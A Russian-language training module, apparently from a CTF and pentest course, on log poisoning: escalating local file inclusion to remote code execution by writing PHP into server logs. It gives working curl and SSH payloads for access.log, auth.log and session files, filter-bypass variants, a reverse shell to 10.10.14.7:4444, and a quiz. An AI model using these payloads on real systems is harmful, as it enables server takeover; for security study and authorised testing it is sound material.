---
id: web-log-poisoning
title: "Log poisoning: LFI → RCE через логи"
category: web
parent: web-lfi-path-traversal
difficulty: medium
order: 1
tags: [lfi, log-poisoning, rce, apache, ssh]
prerequisites: [web-lfi-path-traversal]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 32
summary: "Log poisoning: запись PHP-кода в логи сервера и исполнение через LFI — access.log, error.log, auth.log, SSH, mail."
---

Log poisoning — превращение LFI в RCE через **инъекцию PHP-кода в лог-файл**. Если есть LFI (или чтение файла) и возможность записать управляемую строку в лог (User-Agent, заголовок, имя пользователя, SSH-логин), можно исполнить код через `include`. Это классический способ эскалировать «просто чтение файла» до полного RCE.

## Теория: почему это работает

Лог-файлы содержат **пользовательские данные без экранирования**: Apache пишет `User-Agent`/`Referer` в `access.log`, SSH — имя пользователя в `auth.log`. Если уязвимый `include($_GET['page'])` указывает на лог-файл, PHP исполнит наш код внутри лога. Требование: `include`/`require` (не `readfile`) и путь к логу.

## Вектор 1: Apache access.log

`/var/log/apache2/access.log` (Debian) или `/var/log/httpd/access_log` (RHEL). Инжектим PHP в User-Agent:

```bash
curl -s "https://app.example/" -A '<?php system($_GET["c"]); ?>'
```

Затем подключаем лог и исполняем:

```bash
curl -s "https://app.example/?page=/var/log/apache2/access.log&c=id"
```

Код исполнится при `include` лога. Часто нужно несколько запросов (лог буферизуется) и правильный путь.

## Вектор 2: error.log / nginx

- `/var/log/apache2/error.log` — можно писать через параметры, вызывающие ошибку.
- nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`.
- Инжект в `Referer`/`User-Agent`, если access-log настроен с этими полями.

## Вектор 3: SSH auth.log

`/var/log/auth.log` пишет имена пользователей при неудачном входе:

```bash
ssh '<?php system($_GET["c"]); ?>'@target
# в auth.log появится строка с нашим PHP
curl -s "https://app.example/?page=/var/log/auth.log&c=id"
```

## Вектор 4: mail / session / environ

- **`/var/log/mail.log`** — имя отправителя/получателя.
- **PHP session files** — `/var/lib/php/sessions/sess_<id>`, куда пишутся значения сессии (`session.upload_progress` даёт запись).
- **`/proc/self/environ`** — `User-Agent` попадает в окружение CGI; читаем через LFI и инжектим.
- **`/proc/self/fd/<n>`** — открытые дескрипторы.

## Разобранный пример: LFI + access.log → RCE

Шаг 1 — подтверждаем LFI:

```bash
curl -s "https://app.example/?page=../../../../etc/passwd" | head
```

Шаг 2 — определяем путь лога (Debian vs RHEL) через LFI:

```bash
curl -s "https://app.example/?page=/var/log/apache2/access.log" | head
```

Шаг 3 — инжектим PHP:

```bash
curl -s "https://app.example/" -A '<?php system($_GET["c"]); ?>'
```

Шаг 4 — исполняем:

```bash
curl -s "https://app.example/?page=/var/log/apache2/access.log&c=id"
```

Шаг 5 — reverse shell: `-A '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\""); ?>'`.

## Обходы и детали

- **Лог буферизуется** — сделайте несколько запросов или дождитесь flush.
- **Не тот путь** — переберите `/var/log/{apache2,httpd,nginx}/...`.
- **Лог нечитаем** (`permission denied`) — используйте `/proc/self/environ` или session-файлы.
- **`include` vs `readfile`** — для RCE нужен `include`/`require`.
- **Кодирование** — если PHP-тег режется, пробуйте `<?=`, short-теги (зависят от `short_open_tag`).
- **Logrotate** — лог может «съехать»; инжектите и сразу используйте.

## Где искать

- LFI/`include` с пользовательским путём (см. `web-lfi-path-traversal`).
- Доступ к `/var/log/*` через LFI.
- Возможность задать `User-Agent`/`Referer` (всегда есть).
- `/proc/self/environ`, `/proc/self/fd/`.

## Инструменты

- **`curl`** — инжект и триггер.
- **Burp** — перебор путей логов.
- **`ffuf`** — поиск LFI-параметров (см. `web-tool-ffuf`).
- **`lfimap`** — автоматизация log poisoning.

## Что дальше / decision

1. Есть LFI + `include` → проверьте `/var/log/apache2/access.log`.
2. Лог читается → инжектите PHP в `User-Agent`.
3. Лог нечитаем → `/proc/self/environ`, session-файлы.
4. Исполнилось → reverse shell.
5. Дальше — устойчивый канал + read-back.

## Разобранный пример: SSH auth.log poisoning

Шаг 1 — пробуем залогиниться под «пользователем» с PHP-кодом:

```bash
ssh '<?php system($_GET["c"]); ?>'@app.example
# auth.log: Failed password for <?php system($_GET["c"]); ?> from ...
```

Шаг 2 — подключаем лог через LFI:

```bash
curl -s "https://app.example/?page=/var/log/auth.log&c=id"
```

Шаг 3 — код исполняется. Если sshd не логирует имя — используйте другие логи.

## Альтернативы при недоступных логах

- **PHP session files** (`/var/lib/php/sessions/sess_<id>`): значения сессии пишутся в файл. `session.upload_progress` позволяет записать произвольное имя/значение.
- **`/proc/self/environ`**: `User-Agent` в CGI-окружении.
- **`/proc/self/fd/<n>`**: открытые дескрипторы (иногда содержат тело запроса).
- **MySQL `general_log`** (`/var/lib/mysql/*.log`) — если БД пишет запросы в файл.
- **Email-логи** (`/var/log/mail.log`) — имя отправителя.

## Частые ошибки

- **Использовать `readfile` вместо `include`.** Код не исполнится.
- **Не тот путь лога.** Переберите Debian/RHEL/nginx.
- **Забыть про буферизацию.** Лог появляется не мгновенно.
- **Игнорировать `/proc/self/environ`.** Хорошая альтернатива.
- **Ломать прод.** RCE — только с согласия.

## Полный арсенал payload'ов для логов

Лог-пойзонинг работает, когда payload попадает в файл, который затем включается через LFI. Формируйте PHP-код без пробелов и кавычек, которые ломают лог.

```bash
# 1) через User-Agent (Apache access.log)
curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
# 2) через Accept-Language
curl -s 'https://app.example/' -H 'Accept-Language: <?php system($_GET["c"]); ?>'
# 3) через Referer
curl -s 'https://app.example/' -e '<?php system($_GET["c"]); ?>'
# 4) через путь (в access.log попадает URL)
curl -s 'https://app.example/<?php system($_GET["c"]); ?>'
```

```text
# затем включаем лог через LFI
https://app.example/?page=/var/log/apache2/access.log&c=id
# nginx
https://app.example/?page=/var/log/nginx/access.log&c=id
```

Важно: URL-кодирование в логе — используйте варианты, которые PHP исполнит (`${...}` вместо кавычек, если фильтр мешает).

## Где лежат логи и альтернативные файлы

| Файл | Что туда попадает |
|------|-------------------|
| `/var/log/apache2/access.log` | User-Agent, Referer, путь |
| `/var/log/apache2/error.log` | путь, заголовки |
| `/var/log/nginx/access.log` | запрос целиком |
| `/var/log/nginx/error.log` | путь |
| `/var/log/auth.log` | имя пользователя (SSH) |
| `/var/log/mail.log` | адрес/тема письма |
| `/var/log/vsftpd.log` | имя пользователя (FTP) |
| `/proc/self/environ` | User-Agent (при CGI) |
| `/proc/self/fd/N` | открытые дескрипторы |
| `/var/lib/php/sessions/sess_*` | данные сессии |

```bash
# SSH auth.log: логин с «именем»-payload
ssh '<?php system($_GET["c"]); ?>'@app.example
# FTP: то же через логин
ftp app.example   # USER <?php ...?>
```

## Разобранный пример: LFI + access.log → RCE

```text
1) находим LFI: https://app.example/?page=about.php
2) пробуем traversal: ?page=../../../../etc/passwd  -> работает
3) проверяем чтение лога: ?page=/var/log/apache2/access.log  -> видим свой запрос
4) отправляем запрос с PHP в User-Agent
5) включаем лог с параметром: ?page=/var/log/apache2/access.log&c=id
6) видим вывод id -> RCE
```

```bash
curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
curl -s 'https://app.example/?page=/var/log/apache2/access.log&c=id'
```

## Обходы и детали

| Проблема | Обход |
|----------|-------|
| Лог недоступен | `/proc/self/fd/`, session-файлы |
| Payload кодируется | `${IFS}`, короткие теги `<?=` |
| Нет прав на лог | другой лог/файл |
| Лог ротируется | быстрый доступ сразу после записи |
| Расширение `.php` не исполняется | другой файл (`.phtml`) |
| WAF режет `<?php` | `<?=`, `<? ` |

```bash
# короткий тег и обход пробелов
curl -s 'https://app.example/' -A '<?=`id`?>'
```

## Инструменты

```bash
# LFI-сканеры и эксплуатация
ffuf -u 'https://app.example/?page=FUZZ' -w lfi_wordlist.txt -mr 'root:'
# обёртки PHP (если доступны) — см. web-php-wrappers
curl -s 'https://app.example/?page=php://filter/convert.base64-encode/resource=index.php'
# nuclei LFI-шаблоны
nuclei -u https://app.example -tags lfi -j
```

## Что делать дальше / решение

1. **Найдите LFI.** Traversal, обёртки, параметр включения.
2. **Определите доступные логи.** Проверьте пути из таблицы.
3. **Пойзоньте лог.** User-Agent/Referer/Accept-Language.
4. **Включите лог.** С параметром команды.
5. **Альтернативы.** `/proc/self/*`, сессии, FTP/mail-логи.
6. **Зафиксируйте PoC.** Вывод `id` через лог.

## Практика и справочники

- **PortSwigger Academy** — «File path traversal», «LFI».
- **HackTricks** — «Log poisoning», «LFI to RCE».
- **PayloadsAllTheThings** — «File Inclusion».
- **web-php-wrappers** — обёртки PHP.

## Приоритеты при лог-пойзонинге

Лог-пойзонинг — это связка «LFI + запись в файл». Сначала найдите LFI и убедитесь, что читается `/etc/passwd` (traversal). Затем проверьте доступность логов (`access.log`, `error.log`, `auth.log`, session-файлы) и наличие в них вашего запроса. После этого отправьте запрос с PHP-кодом в User-Agent/Referer и включите лог через LFI. Если логи недоступны, ищите альтернативы: `/proc/self/fd/*`, `/proc/self/environ`, файлы сессий PHP, FTP/mail-логи.

## Кратко

1. LFI + traversal.
2. Доступность логов.
3. Пойзон через заголовок.
4. Включение лога с командой.
5. Альтернативы при закрытых логах.
6. PoC — вывод `id`.

## Практика

- **PortSwigger** — path traversal / LFI.
- **HackTricks** — log poisoning.
- **PayloadsAllTheThings** — File Inclusion.

## Расширенный разбор: связка LFI + лог

| Шаг | Команда | Результат |
|-----|---------|-----------|
| LFI | `?page=../../etc/passwd` | чтение файла |
| лог | `?page=/var/log/apache2/access.log` | видим свои запросы |
| пойзон | `curl -A '<?php ...?>'` | запись в лог |
| RCE | `?page=.../access.log&c=id` | вывод команды |

```bash
# всё одной серией
curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
curl -s 'https://app.example/?page=/var/log/apache2/access.log&c=id'
```

## Альтернативы: когда логи закрыты

Если access.log недоступен, используйте `/proc/self/fd/` (перебор дескрипторов), `/proc/self/environ` (User-Agent при CGI) или файлы сессий PHP (`/var/lib/php/sessions/sess_<id>`) — в них можно записать payload через поле, сохраняемое в сессии. Также подходят `/var/log/mail.log`, `/var/log/vsftpd.log` и логи приложений (`/var/log/app/app.log`), путь которых виден в стек-трейсах.

## Ещё одна проверка

Помните, что payload попадает в лог в закодированном виде: URL-encoded символы в пути и заголовках могут сломать PHP-код. Используйте формы, которые PHP исполнит даже внутри строки лога — короткие теги `<?=`, backticks, `${IFS}` вместо пробелов, а также `$_GET`-параметры вместо констант. Проверьте на своём стенде, как именно выглядит строка в логе.

## Финальная заметка

Лог-пойзонинг требует двух условий: чтение файла (LFI) и возможность записать в него управляемые данные. Если одного из них нет — ищите альтернативный файл (session, environ, app.log) или другой примитив записи. Всегда проверяйте, что записанный PHP действительно исполнился, а не просто попал в файл.

## Квиз

```quiz
- question: "Что такое log poisoning?"
  options:
    - "Удаление логов"
    - "Запись PHP-кода в лог и исполнение его через LFI"
    - "Шифрование логов"
    - "Кеширование"
  answer: 1
  explanation: "Лог становится источником исполняемого кода."
- question: "Через какой заголовок обычно пишут в access.log?"
  options:
    - "Cookie"
    - "User-Agent"
    - "Host"
    - "Accept"
  answer: 1
  explanation: "User-Agent попадает в лог."
- question: "Где лежит Apache access.log (Debian)?"
  options:
    - "/tmp/access.log"
    - "/var/log/apache2/access.log"
    - "/etc/apache2/log"
    - "/home/log"
  answer: 1
  explanation: "Стандартный путь Debian/Ubuntu."
- question: "Что нужно, чтобы include выполнил код?"
  options:
    - "Только чтение файла"
    - "include/require с управляемым путём, а не file_get_contents"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "file_get_contents только читает, не исполняет."
- question: "Что делать, если лог ротирован?"
  options:
    - "Сдаться"
    - "Читать access.log.1/.2/.gz"
    - "Сменить метод"
    - "Увеличить таймаут"
  answer: 1
  explanation: "Ротированные файлы тоже читаемы."
```

## Где пригодится

- **CTF (Web):** LFI-задачи с эскалацией до RCE.
- **Bug bounty:** LFI→RCE — критичный отчёт.
- **Пентест:** аудит include-точек.
- **Работа (AppSec):** allowlist путей, отключение include по вводу, изоляция логов.
